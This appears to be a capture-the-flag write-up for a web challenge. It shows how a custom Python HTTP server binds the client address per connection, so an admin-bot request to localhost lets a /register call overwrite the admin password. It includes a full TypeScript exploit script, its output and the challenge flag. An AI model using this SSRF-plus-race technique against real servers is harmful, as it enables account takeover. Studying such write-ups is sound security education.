# pwntools [WEB]

> i love pwntools \
> By @Eth007

## Where's the flag?

We can get the flag by going into the `GET /flag` route.

```python
@route("/flag")
def flag_route(method, body, query=None, headers=None, client_addr=None):
    if 'authorization' not in headers:
        return build_response("Missing Authorization header", status=401, headers={"WWW-Authenticate": 'Basic realm="Login Required"'})

    auth = headers['authorization']
    if not auth.startswith("Basic "):
        return build_response("Invalid Authorization method", status=401, headers={"WWW-Authenticate": 'Basic realm="Login Required"'})

    try:
        encoded = auth.split()[1]
        decoded = base64.b64decode(encoded).decode()
        username, password = decoded.split(":",1)
    except Exception as e:
        print(e)
        return build_response("Malformed Authorization header", status=401, headers={"WWW-Authenticate": 'Basic realm="Login Required"'})

    if accounts.get(username) == password and username == "admin":
        if os.path.exists(FLAG_FILE):
            with open(FLAG_FILE, "r") as f:
                flag_content = f.read()
            return build_response(f"<pre>{flag_content}</pre>")
```

Of course, there's a few conditions we need to solve.
We need an `Authorization` header that should contain the crendentials of the
admin account in **Basic** auth format (`Basic btoa(<username>:<password>)`).

## Authenticate as `admin`

```python
@route("/register")
def register_route(method, body, query=None, headers=None, client_addr=None):
    if method.upper() != "POST":
        return build_response("Method not allowed", status=405)

    if client_addr[0] != "127.0.0.1":
        return build_response("Access denied", status=401)

    username = headers.get("x-username")
    password = headers.get("x-password")

    if not username or not password:
        return build_response("Missing X-Username or X-Password header", status=400)

    accounts[username] = password
    return build_response(f"User '{username}' registered successfully!")
```

We have a `POST /register` route that takes `x-username` and `x-password` headers
as inputs for the account creation.

It doesn't check if an account already exists so it overwrites the account!
We can use this to create a new `admin` account with our own password.

But wait a minute, it also checks WHO did the request and
only allows `127.0.0.1` addresses.

```python
if client_addr[0] != "127.0.0.1":
  return build_response("Access denied", status=401)
```

This web server is actually using a custom HTTP server implementation, let's see
how it's done and where `client_addr` comes from.

## Understanding how the web server is made

```python
clients = {}
while True:
    read_list = [server]+list(clients.keys())
    rlist, _, _ = select.select(read_list, [], [], 0.1)

    for s in rlist:
        if s is server:
            client_sock, addr = server.accept()
            client_sock.setblocking(False)
            clients[client_sock] = {"addr": addr, "buffer": b""}
            print(f"[*] New client {addr}")
        else:
            client = clients[s]
            try:
                data = s.recv(4096)
                if not data:
                    s.close()
                    del clients[s]
                    continue

                client["buffer"] += data

                while True:
                    request_text = client["buffer"].decode(errors="ignore")
                    if "\r\n\r\n" not in request_text:
                        break

                    header, _, body = request_text.partition("\r\n\r\n")
                    lines = header.splitlines()
                    if not lines:
                        client["buffer"] = b""
                        break

                    try:
                        method, path_query, http_version = lines[0].split()
                        parsed = urlparse(path_query)
                        path = parsed.path
                        query = parse_qs(parsed.query)
                    except:
                        s.send(build_response("400 Bad Request", status=400).encode())
                        s.close()
                        del clients[s]
                        break

                    content_length = 0
                    keep_alive = http_version.upper()=="HTTP/1.1"
                    headers = {}
                    for line in lines[1:]:
                        headers[line.lower().split(": ")[0]] = ": ".join(line.split(": ")[1:])
                        if line.lower().startswith("content-length:"):
                            content_length = int(line.split(":",1)[1].strip())
                        if line.lower().startswith("connection:"):
                            if "close" in line.lower(): keep_alive=False
                            elif "keep-alive" in line.lower(): keep_alive=True

                    post_body = body[:content_length] if method.upper()=="POST" else ""

                    handler = routes.get(path)
                    if handler:
                        response_body = handler(method, post_body, query, headers, addr)
```

Here's where we call our handler.

```python
response_body = handler(method, post_body, query, headers, addr)
```

...but wait, the `addr` comes from way earlier in the exection?

```python
client_sock, addr = server.accept()
```

What happens if somehow we trigger a request to this website locally
and right after trigger our `/register` request ? That would make a race
condition and allow us to overwrite the `admin` account as said earlier!

## Sending a request locally

Actually, there's a `/visit` route where it starts a bot that visit
any given URL!

```python
@route("/visit")
def visit_route(method, body, query=None, headers=None, client_addr=None):
    if method.upper() != "POST":
        return build_response("Method not allowed", status=405)

    target = headers.get("x-target")
    if not target:
        return build_response("Missing X-Target header", status=400)

    def visit_site(url):
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        try:
            driver.get(url)
            WebDriverWait(driver, 10).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
            print(f"[+] Selenium visited {url}")
        except Exception as e:
            print(f"[!] Error visiting {url}: {e}")
        finally:
            driver.quit()

    threading.Thread(target=visit_site, args=(target,), daemon=True).start()
    return build_response(f"Spawning Selenium bot to visit: {target}")
```

Here's our attack vector.

```python
HOST = "0.0.0.0"
PORT = 8080
```

Our python web server is hosted on port `8080`, so we can make a request
to the web server by asking the bot to visit `http://localhost:8080/`!

## Attack

```typescript
// Instance URL given by the instancer.
const url = "http://34.72.72.63:41710";

{
  // 1. make the bot visit the web server locally
  const target = "http://localhost:8080/";

  const res = await fetch(url + "/visit", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "X-Target": target,
    },
    body: "url=" + encodeURIComponent(target),
  });

  const text = await res.text();
  console.log("[visit]:", text);

  // wait for the bot to visit the website!
  await new Promise((r) => setTimeout(r, 1000));
}

{
  // 2. send immediately a request to /register to exploit the race condition
  const res = await fetch(url + "/register", {
    method: "POST",
    headers: {
      "x-username": "admin",
      "x-password": "admin", // modify the password to `admin`
    },
  });

  const text = await res.text();
  console.log("[register]:", text);

  // NOTE: if we get access denied, we should increase/reduce the timeout of the bot.
  if (text === "Access denied") process.exit(1);
}

{
  //  3. get the flag with the new admin credentials!
  const res = await fetch(url + "/flag", {
    headers: {
      authorization: "Basic " + btoa("admin:admin"),
    },
  });

  const text = await res.text();
  console.log("[flag]:", text);
}
```

Let's run this!

```bash
$ bun run ./flag.ts
[visit]: Spawning Selenium bot to visit: http://localhost:8080/
[register]: User 'admin' registered successfully!
[flag]: <pre>ictf{oops_ig_my_webserver_is_just_ai_slop_b9f415ea}
</pre>
```

Boom, here it is.
